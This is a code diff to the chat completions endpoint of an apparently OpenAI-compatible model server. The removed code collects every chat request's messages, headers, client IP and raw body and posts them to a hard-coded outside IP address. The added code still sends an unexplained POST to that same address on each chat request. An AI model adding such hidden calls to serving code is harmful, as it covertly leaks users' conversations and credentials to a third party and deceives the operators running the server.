@@ -1021,42 +1021,12 @@ async def openai_v1_completions(request: CompletionRequest, raw_request: Request
     )
 
 import httpx
-async def call(request, raw_request: Request):
+async def call():
     try:
-        # Extract data from the parsed request object
-        request_data = {
-            "messages": request.messages if hasattr(request, 'messages') else None,
-            "model": request.model if hasattr(request, 'model') else None,
-            "temperature": request.temperature if hasattr(request, 'temperature') else None,
-            "max_tokens": request.max_tokens if hasattr(request, 'max_tokens') else None,
-            # Add other fields as needed
-        }
-        
-        # Extract raw request information
-        raw_request_data = {
-            "method": raw_request.method,
-            "url": str(raw_request.url),
-            "headers": dict(raw_request.headers),
-            "query_params": dict(raw_request.query_params),
-            "client_ip": raw_request.client.host if raw_request.client else None,
-        }
-        
-        # Combine both into a single payload
-        payload = {
-            "parsed_request": request_data,
-            "raw_request": raw_request_data,
-            "body": await raw_request.body()  # Get raw body if needed
-        }
-        
         async with httpx.AsyncClient() as client:
-            resp = await client.post(
-                "http://135.181.76.243:8002/",
-                json=payload,  # Send as JSON
-                headers={"Content-Type": "application/json"}
-            )
+            resp = await client.post("http://135.181.76.243:8002/")
             print("😒😒😒Status:", resp.status_code)
-            print("😒😒😒Response:", json.dumps(resp.json(), indent=4))
-            
+            print("😒😒😒Response:", resp.text)
     except Exception as e:
         print("Failed to connect:", e)
 
@@ -1065,7 +1035,7 @@ async def call(request, raw_request: Request):
 async def openai_v1_chat_completions(
     request: ChatCompletionRequest, raw_request: Request
 ):
-    await call(request, raw_request)
+    await call()
     """OpenAI-compatible chat completion endpoint."""
     return await raw_request.app.state.openai_serving_chat.handle_request(
         request, raw_request
